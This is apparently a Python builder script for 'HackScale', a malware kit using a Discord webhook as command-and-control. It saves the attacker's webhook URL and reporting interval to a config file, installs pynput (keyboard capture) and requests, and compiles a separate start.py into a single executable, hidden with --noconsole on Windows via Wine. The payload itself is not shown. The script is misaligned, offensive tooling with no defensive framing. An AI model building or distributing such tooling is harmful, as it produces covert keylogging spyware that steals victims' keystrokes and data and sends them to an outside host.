#!/usr/bin/env python3

import os
import sys
import subprocess
import argparse
from shutil import which

# -----------------------------------------------
def check_installed(program):
    return which(program) is not None

def install_linux_pyinstaller():
    print("[+] Installing PyInstaller for Linux...")
    subprocess.run(["sudo", "apt", "update"])
    subprocess.run(["sudo", "apt", "install", "-y", "python3-pip"])
    subprocess.run(["pip3", "install", "--upgrade", "pip"])
    subprocess.run(["pip3", "install", "pyinstaller", "requests", "pynput", "thread6"])

def install_wine_python311():
    print("[+] Installing Python 3.11 inside Wine...")
    subprocess.run(["wget", "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe", "-O", "python311.exe"])
    subprocess.run(["wine", "msiexec", "/i", "python311.exe"])
    subprocess.run(["wget", "https://bootstrap.pypa.io/get-pip.py", "-O", "get-pip.py"])
    subprocess.run(['wine', "C:\\Python311\\python.exe", "get-pip.py"])
    subprocess.run(['wine', "C:\\Python311\\python.exe", "-m", "pip", "install", "pyinstaller", "requests", "pynput", "thread6"])

# -----------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="HackScale Setup - Discord C2 Version")
    parser.add_argument("--webhook", required=True, help="Discord webhook URL")
    parser.add_argument("--interval", required=False, default=60, help="Reporting interval in seconds (default: 60)")
    parser.add_argument("--windows", action="store_true", help="Build Windows EXE with Wine Python 3.11")
    parser.add_argument("--linux", action="store_true", help="Build Linux binary")

    args = parser.parse_args()

    # Save config
    with open("config.py", "w") as f:
        f.write(f'WEBHOOK_URL = "{args.webhook}"\n')
        f.write(f'INTERVAL = {args.interval}\n')

    print(f"[+] Saved config: webhook + interval {args.interval} sec")

    if not args.windows and not args.linux:
        print("[-] Please specify --windows or --linux")
        sys.exit(1)

    # -----------------------------------------------
    if args.windows:
        print("[+] Target: Windows")

        if not check_installed("wine"):
            print("[-] Wine is not installed. Please install it first.")
            sys.exit(1)

        possible_paths = [
            "C:\\Python311\\python.exe",
            "C:\\Users\\root\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
            "C:\\Program Files\\Python311\\python.exe",
            "C:\\Program Files (x86)\\Python311\\python.exe"
        ]

        wine_python311 = None

        for path in possible_paths:
            result = subprocess.run(["wine", path, "--version"], stdout=subprocess.PIPE)
            if result.returncode == 0:
                wine_python311 = path
                print(f"[+] Found Wine Python 3.11 at: {path}")
                break

        if not wine_python311:
            print("[!] Python 3.11 not found inside Wine. Installing...")
            install_wine_python311()
            wine_python311 = possible_paths[0]

        print("[+] Checking required packages...")
        subprocess.run(["wine", wine_python311, "-m", "pip", "install", "--upgrade", "pip"])
        subprocess.run(["wine", wine_python311, "-m", "pip", "install", "pyinstaller", "requests", "pynput", "thread6"])

        print("[+] Building Windows EXE...")
        subprocess.run(["wine", wine_python311, "-m", "PyInstaller", "--onefile", "--clean", "--noconsole", "start.py"])

    # -----------------------------------------------
    if args.linux:
        print("[+] Target: Linux")

        if not check_installed("pyinstaller"):
            print("[-] PyInstaller not found. Installing now...")
            install_linux_pyinstaller()
        else:
            subprocess.run(["pip3", "install", "--upgrade", "requests", "pynput", "thread6"])

        print("[+] Building Linux binary...")
        subprocess.run(["pyinstaller", "--onefile", "start.py"])

    print("[+] All done! Check /dist/ for your output.")

# -----------------------------------------------
if __name__ == "__main__":
    main()
